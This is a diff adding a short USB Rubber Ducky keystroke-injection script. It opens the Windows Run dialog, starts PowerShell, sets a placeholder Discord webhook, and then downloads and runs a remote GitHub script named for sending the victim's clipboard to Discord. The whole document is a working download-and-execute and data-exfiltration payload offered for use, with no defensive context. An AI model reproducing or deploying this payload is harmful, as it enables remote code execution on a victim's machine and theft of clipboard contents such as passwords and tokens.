@@ -1,0 +1,13 @@
+REM Clipboard loader from GitHub
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell 
+ENTER
+DELAY 1000
+STRING $webhookUrl = 'INPUT YOUR DISCORD WEBHOOK'
+ENTER
+DELAY 1000
+STRING iex (iwr 'https://raw.githubusercontent.com/ash-indigo/RubberDucky/main/send-clipboard-to-discord.ps1' -UseBasicParsing)
+ENTER
